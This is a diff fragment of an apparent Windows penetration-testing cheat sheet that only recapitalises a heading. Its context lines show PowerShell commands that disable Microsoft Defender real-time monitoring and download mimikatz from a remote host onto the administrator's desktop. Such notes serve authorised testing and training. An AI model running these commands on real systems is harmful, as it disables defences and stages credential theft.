@@ -11,7 +11,7 @@ PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $false
 
 
-# File transfer
+# File Transfer
 
 PS C:\> powershell.exe wget http://10.10.12.39/mimikatz.exe -outfile C:\users\administrator\desktop\mimikatz.exe
 
